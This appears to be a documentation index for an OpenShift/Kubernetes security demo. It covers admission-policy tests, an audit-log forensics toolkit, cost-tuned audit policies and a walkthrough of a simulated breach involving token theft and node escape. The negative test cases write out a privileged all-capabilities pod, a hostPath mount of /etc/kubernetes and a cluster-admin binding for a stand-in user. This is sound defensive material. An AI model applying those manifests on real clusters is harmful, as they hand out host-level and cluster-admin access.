manifests (includes <code>block-risky-netpol</code>) if you haven't:</p> <pre><code>kubectl apply -k iam/vap/manifests/network-policy/\n</code></pre> <p>Run the following test cases (expected results shown):</p> <p>1) Empty rule (BLOCKED)</p> <pre><code>cat &lt;&lt;EOF | kubectl -n dev-team apply -f -\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: fail-empty-rule\nspec:\n  podSelector: {}\n  policyTypes: [\"Ingress\"]\n  ingress:\n  - {}\nEOF\n</code></pre> <p>Expected: Denied by <code>block-risky-netpol</code> (Security Violation)</p> <p>2) 0.0.0.0/0 CIDR (BLOCKED)</p> <pre><code>cat &lt;&lt;EOF | kubectl -n dev-team apply -f -\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: fail-cidr-zero\nspec:\n  podSelector: {}\n  policyTypes: [\"Ingress\"]\n  ingress:\n  - from:\n    - ipBlock:\n        cidr: 0.0.0.0/0\nEOF\n</code></pre> <p>Expected: Denied by <code>block-risky-netpol</code> (Security Violation)</p> <p>3) Valid deny-all (PASS)</p> <pre><code>cat &lt;&lt;EOF | kubectl -n dev-team apply -f -\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: pass-deny-all\nspec:\n  podSelector: {}\n  policyTypes: [\"Ingress\"]\n  ingress: []\nEOF\n</code></pre> <p>Expected: Created</p> <p>4) Valid specific CIDR (PASS)</p> <pre><code>cat &lt;&lt;EOF | kubectl -n dev-team apply -f -\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: pass-specific-cidr\nspec:\n  podSelector: {}\n  policyTypes: [\"Ingress\"]\n  ingress:\n  - from:\n    - ipBlock:\n        cidr: 10.0.0.0/8\nEOF\n</code></pre> <p>Expected: Created</p> <p>6) Test Pod security checks (privileged, hostPath, automount)</p> <ul> <li>Privileged container test (should be denied in enforced namespaces):</li> </ul> <pre><code>cat &lt;&lt;EOF | kubectl -n dev-team apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: privileged-pod\nspec:\n  containers:\n  - name: core-runtime\n    image: quay.io/hummingbird/core-runtime\n    securityContext:\n      privileged: true\n      allowPrivilegeEscalation: true\n      capabilities:\n        add: [\"ALL\"]\n    command: [\"sleep\", \"3600\"]\nEOF\n</code></pre> <p>Expected: Denied for privileged container.</p> <ul> <li>Sensitive hostPath (should be denied):</li> </ul> <pre><code>cat &lt;&lt;EOF | kubectl -n dev-team apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: hostpath-pod\nspec:\n  securityContext:\n    runAsNonRoot: true\n  containers:\n  - name: core-runtime\n    image: quay.io/hummingbird/core-runtime\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop: [\"ALL\"]\n      runAsNonRoot: true\n      seccompProfile:\n        type: RuntimeDefault\n    command: [\"sleep\", \"3600\"]\n  volumes:\n  - name: host\n    hostPath:\n      path: /etc/kubernetes\n      type: Directory\nEOF\n</code></pre> <p>Expected: Denied for sensitive hostPath mount.</p> <ul> <li>Automount test:</li> <li>In <code>platform-ops</code> (has <code>custom.security/automount=true</code>) the automount exemption should allow pods with automount enabled.</li> <li>In <code>dev-team</code>, pods must set <code>automountServiceAccountToken: false</code> or be denied.</li> </ul> <pre><code># Should be allowed in platform-ops\ncat &lt;&lt;EOF | kubectl -n platform-ops apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: platform-pod\nspec:\n  securityContext:\n    runAsNonRoot: true\n  containers:\n  - name: core-runtime\n    image: quay.io/hummingbird/core-runtime\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop: [\"ALL\"]\n      runAsNonRoot: true\n      seccompProfile:\n        type: RuntimeDefault\n    command: [\"sleep\",\"3600\"]\nEOF\n\n# Should be denied in dev-team unless automount disabled\ncat &lt;&lt;EOF | kubectl -n dev-team apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: dev-pod\nspec:\n  automountServiceAccountToken: true\n  securityContext:\n    runAsNonRoot: true\n  containers:\n  - name: core-runtime\n    image: quay.io/hummingbird/core-runtime\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop: [\"ALL\"]\n      runAsNonRoot: true\n      seccompProfile:\n        type: RuntimeDefault\n    command: [\"sleep\",\"3600\"]\nEOF\n</code></pre> <p>7) Test RBAC cluster-admin allow-list</p> <p>Attempt to create a <code>ClusterRoleBinding</code> that grants <code>cluster-admin</code> to an unapproved user. Expect admission denial.</p> <pre><code>cat &lt;&lt;EOF | kubectl apply -f -\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: bad-cluster-admin\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: cluster-admin\nsubjects:\n- kind: User\n  name: evil-user@example.com\nEOF\n</code></pre> <p>Expected: Denied because subject not in allow-list.</p> <p>8) Useful queries to observe policy hits / denials</p> <ul> <li> <p>Inspect admission webhook/validation logs (depends on controller). If using the upstream VAP controller, check its logs.</p> </li> <li> <p>Using <code>kubectl</code> to see why a pod was denied will show the admission error returned at create time.</p> </li> </ul> <p>9) Cleanup</p> <pre><code>kubectl -k iam/vap/manifests/ -n default delete --ignore-not-found=true\nkubectl delete namespace dev-team finance-app platform-ops --ignore-not-found=true\n</code></pre> <p>(If you applied only specific files, delete those specific resources instead.)</p> <p>If you want, I can also: - Add example Namespace YAML files into <code>iam/vap/examples/</code> and commit them. - Add small scripts under <code>iam/vap/scripts/</code> to automate the apply/test/cleanup sequence.</p> <p>Tell me which you'd like next and I'll update the TODOs and create the files.</p>"},{"location":"auditing/","title":"OpenShift Audit Log Forensics","text":"<p>This directory contains a complete toolkit and investigation guide for performing forensic analysis on OpenShift/Kubernetes Audit Logs. It is designed to demonstrate how to reconstruct a security incident, from initial access to node compromise, using only the immutable evidence found in the API logs.</p>"},{"location":"auditing/#contents","title":"Contents","text":"<ul> <li><code>forensics.sh</code>: A Bash library containing specialized functions to query, filter, and analyze audit logs. It turns raw JSON logs into human-readable forensic artifacts.</li> <li><code>audit-log-Investigation.md</code>: A comprehensive, step-by-step tutorial that walks through a simulated breach of a \"Visa Payment\" application. It uses the library to hunt for the attacker.</li> <li><code>kubectl-timemachine-instructions.md</code>: Instructions for using the kubectl-timemachine plugin.</li> <li><code>logs/audit.log.tar.gz</code>: A sample audit log file containing the evidence of the simulated attack. Use this if you don't have a live cluster to investigate.</li> </ul>"},{"location":"auditing/#getting-started","title":"Getting Started","text":""},{"location":"auditing/#prerequisites","title":"Prerequisites","text":"<ul> <li><code>jq</code>: Required for parsing JSON logs.</li> <li><code>column</code>: (Standard in most Linux/macOS distros) for formatting output.</li> <li><code>oc</code>: OpenShift CLI (optional, only needed if fetching fresh logs from a cluster).</li> </ul>"},{"location":"auditing/#setup","title":"Setup","text":"<ol> <li> <p>Extract the sample logs: <pre><code>tar -xzvf logs/audit.tar.gz\n</code></pre></p> </li> <li> <p>Load the forensic library: <pre><code>source forensics.sh\n</code></pre></p> </li> </ol>"},{"location":"auditing/#the-forensic-toolkit","title":"The Forensic Toolkit","text":"<p>Once loaded, you have access to the following forensic capabilities:</p> Function Description <code>audit_fetch_logs</code> Fetch current audit logs from all master nodes. <code>audit_detect_anonymous_access</code> Hunt for <code>403 Forbidden</code> probes from unauthenticated sources. <code>audit_detect_reconnaissance</code> Detect <code>SelfSubjectAccessReview</code> calls (manual permission enumeration). <code>audit_detect_resource_harvesting</code> Find bulk <code>List</code> operations on Secrets, ConfigMaps, and Pods. <code>audit_detect_privileged_pods</code> Alert on the creation of pods with <code>HostPID</code> or <code>Privileged</code> flags. <code>audit_detect_exec_sessions</code> Identify interactive <code>oc exec</code> sessions into pods. <code>audit_extract_pod_payload</code> Extract the Container Image and Command from a pod creation event. <code>audit_lookup_pod_by_ip</code> Correlate an IP address to a Pod using OVN annotations. <code>audit_track_ip_activity</code> Show the full history of actions performed by a specific IP. <code>audit_track_pod_lifecycle</code> Reconstruct the complete timeline of a pod (Creation -&gt; IP -&gt; Events). <code>audit_detect_admin_grants</code> Detect creation of <code>ClusterRoleBinding</code> to <code>cluster-admin</code>. <code>audit_detect_port_forward</code> Detect usage of <code>oc port-forward</code> tunneling. <code>audit_detect_node_debug</code> Detect usage of <code>oc debug node</code> (Root Shell on Host). <code>audit_detect_sensitive_mounts</code> Detect pods mounting <code>/etc/kubernetes</code> or container sockets. <code>audit_detect_bruteforce</code> Identify top sources of <code>401 Unauthorized</code> errors."},{"location":"auditing/#the-investigation-scenario","title":"The Investigation Scenario","text":"<p>The included guide (<code>audit-log-Investigation.md</code>) covers a \"Kill Chain\" scenario involving: 1.  Initial Access: Exploiting a vulnerability in a frontend service (<code>asset-cache</code>). 2.  Lateral Movement: Stealing a Service Account token. 3.  Privilege Escalation: Abusing <code>cluster-admin</code> rights. 4.  Persistence/Action: Escaping to the underlying Node using a privileged pod.</p> <p>Follow the guide to learn how to use the toolkit to uncover each step of this attack.</p>"},{"location":"auditing/#kubectl-timemachine","title":"Kubectl Timemachine","text":"<p>The <code>kubectl-timemachine</code> plugin allows you to \"travel back in time\" and view the state of the cluster as it was recorded in the audit logs. It reconstructs resources (like Pods) from the audit events.</p>"},{"location":"auditing/#example-usage","title":"Example Usage","text":"<pre><code>\u279c  ~ kubectl timemachine --auditlog-file=audit.log get pods -n payments -o wide \nNAMESPACE  NAME                                   AGE  STATUS   IP            NODE    \npayments   gateway-79d69c8875-72kpm               26m  Running  10.130.0.71   master-1\npayments   mastercard-processor-59986f994c-gtpdn  26m  Running  10.128.0.215  master-2\npayments   visa-processor-7d57964dc8-x45hb        26m  Running  10.130.0.72   master-1\n\u279c  ~ kubectl timemachine --auditlog-file=audit.log get pods -n frontend -o wide \nNAMESPACE  NAME                          AGE  STATUS   IP            NODE    \nfrontend   asset-cache-7d548fc66f-l67rb  26m  Running  10.128.0.212  master-2\nfrontend   blog-7776768bf6-zq2rp         26m  Running  10.130.0.69   master-1\nfrontend   webapp-7f77777944-zp85r       26m  Running  10.130.0.70   master-1\n\u279c  ~ \n</code></pre>"},{"location":"auditing/apiserver/","title":"OpenShift Audit Policy: Forensic Value vs. Splunk Costs","text":""},{"location":"auditing/apiserver/#overview","title":"Overview","text":"<p>This configuration is designed to solve a critical operational challenge: Reducing log ingestion costs (e.g., Splunk license limits) without sacrificing the forensic data needed to investigate security incidents.</p> <p>Standard OpenShift audit logs are extremely verbose. Without tuning, infrastructure components generate terabytes of low-value data (heartbeats, leader elections) that drown out the high-value signals (user changes, application deployments).</p> <p>This policy uses a \"Blocklist Strategy\": it explicitly silences known noisy infrastructure namespaces so that we can afford to enable full detailed logging for everything else (your applications and users).</p>"},{"location":"auditing/apiserver/#the-configuration","title":"The Configuration","text":"<p>Note: The following configuration uses <code>None</code> for many groups to simplify lab testing and reduce log volume. In production environments, it is recommended to use <code>Default</code> for most infrastructure groups to retain essential metadata for forensics.</p> <pre><code>spec:\n  audit:\n    customRules:\n    - group: system:nodes\n      profile: None\n    - group: system:kube-proxy\n      profile: None\n    - group: system:kube-controller-manager\n      profile: None\n    - group: system:kube-scheduler\n      profile: None\n    - group: system:apiserver\n      profile: None\n    - group: system:serviceaccounts:stackrox\n      profile: None\n    - group: system:serviceaccounts:netobserv\n      profile: None\n    - group: system:serviceaccounts:openshift-cnv\n      profile: None\n    - group: system:serviceaccounts:kube-system\n      profile: None\n    - group: system:serviceaccounts:openshift-monitoring\n      profile: None\n    - group: system:serviceaccounts:openshift-sdn\n      profile: None\n    - group: system:serviceaccounts:openshift-ovn-kubernetes\n      profile: None\n    - group: system:serviceaccounts:openshift-console\n      profile: None\n    - group: system:serviceaccounts:openshift-etcd\n      profile: None\n    - group: system:serviceaccounts:openshift-image-registry\n      profile: None\n    - group: system:serviceaccounts:openshift-machine-config-operator\n      profile: None\n    - group: system:serviceaccounts:openshift-cluster-version\n      profile: None\n    - group: system:serviceaccounts:openshift-apiserver\n      profile: None\n    - group: system:serviceaccounts:openshift-kube-apiserver\n      profile: None\n    - group: system:serviceaccounts:openshift-kube-controller-manager\n      profile: None\n    - group: system:serviceaccounts:openshift-kube-scheduler\n      profile: None\n    - group: system:serviceaccounts:openshift-authentication\n      profile: None\n    - group: system:serviceaccounts:openshift-ingress\n      profile: Default\n    - group: system:serviceaccounts:openshift\n      profile: None\n    - group: system:authenticated:oauth\n      profile: WriteRequestBodies\n    - group: system:authenticated\n      profile: WriteRequestBodies\n    - group: system:serviceaccounts\n      profile: WriteRequestBodies\n    - group: system:unauthenticated\n      profile: None\n    profile: Default\n</code></pre>"},{"location":"auditing/apiserver/#detailed-explanation-of-rules","title":"Detailed Explanation of Rules","text":""},{"location":"auditing/apiserver/#1-the-silencers-rule-1","title":"1. The Silencers (Rule #1)","text":"<ul> <li>Target: <code>system:nodes</code>, <code>kube-proxy</code>, etc.</li> <li>Action: <code>profile: \"None\"</code></li> <li>Why: These components \"chat\" with the API server thousands of times per second just to say \"I'm alive.\" This data has zero forensic value and is the primary driver of log volume. We discard it completely.</li> </ul>"},{"location":"auditing/apiserver/#2-the-infrastructure-blocklist-rule-2","title":"2. The Infrastructure Blocklist (Rule #2)","text":"<ul> <li>Target: <code>openshift-monitoring</code>, <code>openshift-ingress</code>, <code>kube-system</code>, etc.</li> <li>Action: <code>profile: \"Default\"</code> (Metadata Only)</li> <li>Why: These namespaces contain trusted OpenShift operators. They perform millions of \"Lease Updates\" (leader election) daily.<ul> <li>Cost Impact: A Lease update body is large JSON. Multiplying this by millions of events creates massive Splunk bills.</li> <li>Solution: We log Metadata Only. We see that an update happened (for security tracking), but we strip out the heavy JSON body.</li> </ul> </li> </ul>"},{"location":"auditing/apiserver/#3-the-application-catch-all-rule-3","title":"3. The Application \"Catch-All\" (Rule #3)","text":"<ul> <li>Target: <code>system:serviceaccounts</code> (Global Group)</li> <li>Action: <code>profile: \"WriteRequestBodies\"</code></li> <li>Why: This is the genius of the configuration. Audit rules are processed top-to-bottom.<ul> <li>If a request comes from <code>openshift-monitoring</code>, it is caught by Rule #2 (Quiet).</li> <li>If a request comes from your apps (<code>backend</code>, <code>payments</code>) or any new project you create tomorrow, it falls through to Rule #3.</li> <li>Result: Your applications get Full Body Logging automatically. You capture the exact YAML of every deployment, patch, or config change without manual configuration.</li> </ul> </li> </ul>"},{"location":"auditing/apiserver/#4-human-accountability-rule-4","title":"4. Human Accountability (Rule #4)","text":"<ul> <li>Target: <code>system:authenticated</code>, <code>oauth</code></li> <li>Action: <code>profile: \"WriteRequestBodies\"</code></li> <li>Why: Human users (Admins, Developers) perform low-volume but high-risk actions. We always capture the full details of what a human changed.</li> </ul>"},{"location":"auditing/apiserver/#value-proposition","title":"Value Proposition","text":"<p>By filtering out high-volume, low-value infrastructure noise (like heartbeats and leader elections), we significantly reduce log ingestion volume. This allows us to retain full-fidelity logs for critical user actions and application changes without incurring prohibitive storage or SIEM costs.</p>"},{"location":"auditing/apiserver/#how-to-apply","title":"How to Apply","text":"<p>You can apply this configuration directly to your cluster using the following command:</p> <pre><code>cat &lt;&lt;EOF | oc patch apiserver cluster --type=merge --patch-file /dev/stdin\nspec:\n  audit:\n    customRules:\n    - group: system:nodes\n      profile: None\n    - group: system:kube-proxy\n      profile: None\n    - group: system:kube-controller-manager\n      profile: None\n    - group: system:kube-scheduler\n      profile: None\n    - group: system:apiserver\n      profile: None\n    - group: system:serviceaccounts:stackrox\n      profile: None\n    - group: system:serviceaccounts:netobserv\n      profile: None\n    - group: system:serviceaccounts:openshift-cnv\n      profile: None\n    - group: system:serviceaccounts:kube-system\n      profile: None\n    - group: system:serviceaccounts:openshift-monitoring\n      profile: None\n    - group: system:serviceaccounts:openshift-sdn\n      profile: None\n    - group: system:serviceaccounts:openshift-ovn-kubernetes\n      profile: None\n    - group: system:serviceaccounts:openshift-console\n      profile: None\n    - group: system:serviceaccounts:openshift-etcd\n      profile: None\n    - group: system:serviceaccounts:openshift-image-registry\n      profile: None\n    - group: system:serviceaccounts:openshift-machine-config-operator\n      profile: None\n    - group: system:serviceaccounts:openshift-cluster-version\n      profile: None\n    - group: system:serviceaccounts:openshift-apiserver\n      profile: None\n    - group: system:serviceaccounts:openshift-kube-apiserver\n      profile: None\n    - group: system:serviceaccounts:openshift-kube-controller-manager\n      profile: None\n    - group: system:serviceaccounts:openshift-kube-scheduler\n      profile: None\n    - group: system:serviceaccounts:openshift-authentication\n      profile: None\n    - group: system:serviceaccounts:openshift-ingress\n      profile: Default\n    - group: system:serviceaccounts:openshift\n      profile: None\n    - group: system:authenticated:oauth\n      profile: WriteRequestBodies\n    - group: system:authenticated\n      profile: WriteRequestBodies\n    - group: system:serviceaccounts\n      profile: WriteRequestBodies\n    - group: system:unauthenticated\n      profile: None\n    profile: Default\nEOF\n</code></pre>"},{"location":"auditing/apiserver/#next-steps-log-forwarding","title":"Next Steps: Log Forwarding","text":"<p>This configuration is the first line of defense (at the source).</p> <p>To further optimize costs, we can configure the OpenShift Log Forwarder to drop specific events before they leave the cluster.</p> <ul> <li>Example: \"If the event is from <code>openshift-monitoring</code> AND the resource is <code>leases</code>, drop it entirely.\"</li> </ul> <p>This dual-layer approach (Source Tuning + Collector Filtering) ensures you pay only for the data that has real security value.</p>"},{"location":"auditing/apiserver/#advanced-filtering-with-clusterlogforwarder","title":"Advanced Filtering with ClusterLogForwarder","text":"<p>To extract specific user events or filter out noise before forwarding logs to your SIEM (like Splunk), you can use the <code>ClusterLogForwarder</code> API. This allows you to define granular rules based on users, verbs, resources, and more.</p>"},{"location":"auditing/apiserver/#example-1-targeting-specific-users-and-actions","title":"Example 1: Targeting Specific Users and Actions","text":"<p>This configuration captures actions by specific users (e.g., <code>user1</code>), successful logins (OAuth token creation), and failed login attempts, while filtering out everything else.</p> <pre><code>apiVersion: logging.openshift.io/v1\nkind: ClusterLogForwarder\nmetadata:\n  name: instance\n  namespace: openshift-logging\nspec:\n  filters:\n  - kubeAPIAudit:\n      omitStages:\n      - RequestReceived\n      rules:\n      - level: Request # Track \"create\", \"patch\", \"delete\" for user1.\n        users:\n        - user1\n        verbs: [\"create\", \"patch\", \"delete\"]\n      - level: Request # Track successful logins (oauthaccesstokens creation)\n        users:\n        - \"system:serviceaccount:openshift-authentication:oauth-openshift\"\n        verbs: [\"create\"]\n        resources:\n        - group: \"oauth.openshift.io\"\n          resources: [\"oauthaccesstokens\"]\n      - level: Request # Track failed login attempts\n        users: [\"system:anonymous\"]\n        nonResourceURLs:\n        - \"/oauth/authorize*\"\n        verbs: [\"get\"]\n      - level: None # Filter out everything else\n    name: my-policy\n    type: kubeAPIAudit\n  inputs:\n  - name: selected-audit-logs\n    audit:\n      sources:\n      - kubeAPI\n      - openshiftAPI\n  pipelines:\n  - filterRefs:\n    - my-policy\n    inputRefs:\n    - selected-audit-logs\n    name: enable-logstore\n    outputRefs:\n    - default\n</code></pre>"},{"location":"auditing/apiserver/#example-2-excluding-system-users","title":"Example 2: Excluding System Users","text":"<p>If you prefer to capture all user activity but exclude system accounts (service accounts, etc.), use this approach:</p> <pre><code>apiVersion: logging.openshift.io/v1\nkind: ClusterLogForwarder\nmetadata:\n  name: instance\n  namespace: openshift-logging\nspec:\n  filters:\n  - kubeAPIAudit:\n      omitStages:\n      - RequestReceived\n      rules:\n      - level: Request # Track failed login attempts\n        users: [\"system:anonymous\"]\n        nonResourceURLs:\n        - \"/oauth/authorize*\"\n        verbs: [\"get\"]\n      - level: None # Exclude all system users\n        users:\n        - \"system:*\"\n      - level: Request # Track \"create\", \"patch\", \"delete\" for any other user\n        verbs: [\"create\", \"patch\", \"delete\"]\n      - level: Request # Track successful logins\n        users:\n        - \"system:serviceaccount:openshift-authentication:oauth-openshift\"\n        verbs: [\"create\"]\n        resources:\n        - group: \"oauth.openshift.io\"\n          resources: [\"oauthaccesstokens\"]\n      - level: None # Filter out everything else\n    name: my-policy\n    type: kubeAPIAudit\n  inputs:\n  - name: selected-audit-logs\n    audit:\n      sources:\n      - kubeAPI\n      - openshiftAPI\n  pipelines:\n  - filterRefs:\n    - my-policy\n    inputRefs:\n    - selected-audit-logs\n    name: enable-logstore\n    outputRefs: \n    - default\n</code></pre>"},{"location":"auditing/audit-log-Investigation/","title":"Forensic Engineering: The OpenShift Audit Log Investigation","text":""},{"location":"auditing/audit-log-Investigation/#1-overview","title":"1. Overview","text":"<p>Audit logs in OpenShift are the authoritative, tamper-evident record of every API request processed by the control plane. Each entry captures who performed the action, what they did, when it occurred, where in the cluster it happened, and how the request was evaluated.</p> <p>Properly enabled and analyzed, these logs form the backbone of threat detection, incident response, compliance evidence, and continuous-monitoring programs.</p>"},{"location":"auditing/audit-log-Investigation/#why-audit-logs-are-critical","title":"Why Audit Logs Are Critical","text":"<ul> <li>Credential Abuse: Attackers \"log in\" with stolen tokens and run standard API calls.</li> <li>Privilege Escalation: Misconfigured RoleBindings that silently lift permissions.</li> <li>Lateral Movement: Cross-namespace secret reads are often visible only in audit metadata.</li> <li>Policy Drift: Excessive SecurityContextConstraints (SCC) exemptions.</li> </ul>"},{"location":"auditing/audit-log-Investigation/#2-audit-log-structure","title":"2. Audit Log Structure","text":"<p>Audit events are emitted as JSON objects. Under the Default profile, only metadata is captured; request bodies are omitted.</p> Field Description Example <code>timestamp</code> Time the API server received the request. <code>2025-07-02T10:15:00Z</code> <code>user.username</code> User / service-account identity. <code>system:serviceaccount:default:default</code> <code>user.groups</code> Groups attached to the identity. <code>[\"system:serviceaccounts\",\"system:authenticated\"]</code> <code>sourceIPs</code> Source IP address(es). <code>[\"10.128.0.45\"]</code> <code>verb</code> API verb. <code>get</code>, <code>create</code>, <code>delete</code>, <code>patch</code> <code>objectRef.resource</code> Target resource kind. <code>secrets</code>, <code>pods</code>, <code>rolebindings</code> <code>objectRef.namespace</code> Namespace (project). <code>production</code> <code>subresource</code> Subresource acted on. <code>exec</code>, <code>portforward</code> <code>responseStatus.code</code> Result of the request. <code>200</code> (OK), <code>403</code> (Forbidden) <code>annotations</code> RBAC decision, PodSecurity/SCC match. <code>\"authorization.k8s.io/decision\":\"allow\"</code> <p>Note: Request bodies for Secret, Route, and OAuthClient are never logged in any profile.</p>"},{"location":"auditing/audit-log-Investigation/#part-1-the-immutable-truth","title":"Part 1: The Immutable Truth","text":"<p>In any production cluster, observability is crucial. Metrics such as CPU usage and memory consumption provide insights into the health of applications. However, during a security incident, the focus shifts from health to accountability and intent.</p> <p>Audit logs serve as the definitive record of actions within the cluster. They are the authoritative record of the Control Plane, capturing the 5 Ws of every interaction with the API Server: Who, What, Where, When, and the Decision (RBAC).</p>"},{"location":"auditing/audit-log-Investigation/#prerequisite-1-storage-integrity","title":"Prerequisite 1: Storage Integrity","text":"<p>Before we start the hunt, we must address the most important rule of forensic logging: Storage Integrity.</p> <p>Audit logs are generated on the Master nodes. If an attacker successfully escalates privileges and takes over the node (Root compromise), they can wipe the log files. Therefore, for these logs to be legally and forensically valid, they must be forwarded to an external system (Splunk, Elastic, Remote Syslog).</p>"},{"location":"auditing/audit-log-Investigation/#prerequisite-2-the-audit-profile","title":"Prerequisite 2: The Audit Profile","text":"<p>Secure logs are useless if they don't contain enough detail. This is defined by the Audit Log Policy.</p> <p>By default, OpenShift uses the Metadata profile. This is like a phone bill: it tells you who called whom and for how long, but it does not record the conversation.</p> <p>For a deep forensic investigation\u2014where we need to see the exact commands an attacker ran (<code>exec</code>), the malicious image they pulled, or the IP address assigned to their pod\u2014we require a higher resolution: Request Bodies.</p> Profile Forensic Visibility What you see What you miss Default Low Metadata (User, Verb, Resource, Response Code). The Payload. You cannot see the pod spec (hostPID), the specific command arguments, or the IP assignment in status updates. WriteRequestBodies High (Recommended) All Metadata + The Full Payload for \"Write\" actions (Create, Update, Patch). Read payloads (e.g., you can't see which secret specifically was read if looking at the body, but you know a read happened). AllRequestBodies Maximum Everything. Nothing. (Extremely high storage cost). <p>Forensic Note: For this investigation, we assume the cluster was configured with <code>WriteRequestBodies</code>. This allows us to see the \"Smoking Gun\" evidence: the malicious <code>hostPID</code> flag in the pod creation request and the exact IP address assigned by the Node.</p>"},{"location":"auditing/audit-log-Investigation/#part-2-the-incident-scenario","title":"Part 2: The Incident Scenario","text":"<p>We are investigating a suspected breach of our \"Visa Payment\" application. Intelligence suggests a sophisticated Kill Chain involving two specific workloads:</p> <ul> <li>Frontend: <code>asset-cache</code> (Namespace: <code>frontend</code>)</li> <li>Payments: <code>visa-processor</code> (Namespace: <code>payments</code>)</li> </ul> <p>The Attack Theory:</p> <ol> <li>Application Exploit: The attacker exploited a vulnerability in the <code>asset-cache</code> code. Because this is an application-level exploit, the Audit Log is blind to it.</li> <li>The \"Loud\" Failure: The attacker tried to talk to the API from <code>asset-cache</code> but failed because that account is locked down.</li> <li>Lateral Movement: They pivoted to the <code>visa-processor</code>, stole the token, and found it had <code>cluster-admin</code> rights due to a misconfiguration in the RoleBinding, which granted excessive privileges to the service account.</li> <li>The Trigger: The moment the attacker uses that stolen token to talk to the OpenShift API, they step out of the shadows and into our logs.</li> </ol> <p>We will now switch to the terminal to reconstruct this timeline using Behavioral Analysis.</p>"},{"location":"auditing/audit-log-Investigation/#part-3-the-investigation","title":"Part 3: The Investigation","text":""},{"location":"auditing/audit-log-Investigation/#setup-load-the-forensic-library","title":"Setup: Load the Forensic Library","text":""},{"location":"auditing/audit-log-Investigation/#prerequisites","title":"Prerequisites","text":"<ul> <li><code>jq</code>: Required for parsing JSON logs.</li> <li><code>column</code>: (Standard in most Linux/macOS distros) for formatting output.</li> <li><code>oc</code>: OpenShift CLI (optional, only needed if fetching fresh logs from a cluster).</li> </ul> <p>Before we begin, we will load our forensic toolkit. This library contains pre-built functions to query the audit logs efficiently.</p> <pre><code>git clone https://github.com/ralvares/security-demos\ncd security-demos/use_cases/auditing\nsource forensics.sh\n</code></pre>"},{"location":"auditing/audit-log-Investigation/#step-1-investigating-the-entry-point","title":"Step 1: Investigating the Entry Point","text":"<p>We begin our investigation by looking for suspicious anonymous API activity originating from within the cluster. Our first clue is a set of <code>403 Forbidden</code> audit log entries where the <code>user</code> is <code>system:anonymous</code> and the <code>sourceIPs</code> field contains an address from the pod network (e.g., <code>10.128.x.y</code>).</p> <p>By focusing on these events, we can identify API requests that likely originated from a pod, rather than from a node, router, or external source. This method allows us to attribute activity to in-cluster workloads and is a common first step in forensic analysis.</p> <p>Once we identify a pod IP making these anonymous requests, we can correlate it to a specific workload. </p> <p>At this stage, we search for anonymous <code>403 Forbidden</code> attempts from the pod network:</p> <pre><code>audit_detect_anonymous_access logs/audit.log\n</code></pre> <p>Explanation: Understanding <code>sourceIPs</code> - The audit field <code>sourceIPs</code> reflects the IPs observed by the API server for the client connection. In most cases, the first element is the pod IP (e.g., <code>10.128.x.y</code>). - For deeper enrichment, OpenShift Network Observability can link the IP to the pod/workload, namespace, and node, providing a quick pivot from IP \u2192 pod \u2192 owner.</p>"},{"location":"auditing/audit-log-Investigation/#network-identity","title":"Network Identity","text":"<p>Finally, to correlate network flows with these events, we need to know the IP address assigned to the malicious pod at the time of creation. In OpenShift/OVN, this is stored in the <code>k8s.ovn.org/pod-networks</code> annotation.</p> <p>The Query: <pre><code>TARGET_IP=10.128.1.81\naudit_lookup_pod_by_ip logs/audit.log $TARGET_IP\n</code></pre></p> <p>The Finding: This reveals the ephemeral IP address assigned to the asset-cache pod.</p>"},{"location":"auditing/audit-log-Investigation/#about-the-asset-cache-pod","title":"About the asset-cache Pod","text":"<p>Through this correlation, we determined that the suspicious pod IP belonged to the <code>asset-cache</code> pod in the <code>frontend</code> namespace. The <code>asset-cache</code> application is a stateless frontend cache service, typically exposed to external traffic and designed to improve performance by storing frequently accessed data. In this scenario, it was running with minimal privileges and, crucially, did not mount a Kubernetes service account token.</p> <p>This lack of a service account token meant that any API requests made from the pod would be anonymous. The attacker exploited a remote code execution (RCE) vulnerability in the <code>asset-cache</code> application, allowing them to run arbitrary commands inside the pod. Their first attempts to access the Kubernetes API were therefore made as <code>system:anonymous</code>, and were blocked by RBAC, as seen in the audit logs.</p> <p>Only after linking the pod IP to the <code>asset-cache</code> workload did we realize this was the initial entry point for the attack chain. This highlights the importance of correlating network-level evidence with workload metadata during forensic investigations.</p> <p>The Finding: We see multiple entries. The attacker tried to <code>list secrets</code> and <code>get pods</code> from the <code>asset-cache</code> pod, but OpenShift blocked them (403).</p> <ul> <li>Forensic Insight: This confirms the pod is compromised, but the attacker hit a wall. They need a valid account.</li> </ul>"},{"location":"auditing/audit-log-Investigation/#investigating-the-ip-history-the-identity-switch","title":"Investigating the IP History (The Identity Switch)","text":"<p>Now that we have a suspicious IP (<code>10.128.1.81</code>), we must ask: \"Did this IP ever succeed?\"</p> <p>We run a history check on this specific IP to see if it ever made a request with a valid identity. This is how we detect if the attacker managed to steal a token and use it from the compromised pod.</p> <pre><code>TARGET_IP=\"10.128.1.81\"\naudit_track_ip_activity logs/audit.log $TARGET_IP\n</code></pre> <p>The Finding: We observe a critical shift. The logs show initial <code>system:anonymous</code> failures (403), followed by successful requests (200) authenticated as <code>system:serviceaccount:payments:visa-processor</code>.</p> <p>Conclusion: The attacker did not just stay in <code>asset-cache</code>. They stole the token of the <code>visa-processor</code> service account and are using it from the <code>asset-cache</code> pod (or they moved to the <code>visa-processor</code> pod, but the IP correlation suggests the former if the IP matches). Note: If the IP changed, we would track the new IP.</p>"},{"location":"auditing/audit-log-Investigation/#step-2-tracking-the-compromised-identity-the-full-picture","title":"Step 2: Tracking the Compromised Identity (The Full Picture)","text":"<p>Exploiting the lack of NetworkPolicies, the attacker moved laterally to the <code>visa-processor</code> pod and abused a known vulnerability in its outdated Apache Struts to gain access and steal the token.</p> <p>Now that we have identified the compromised account 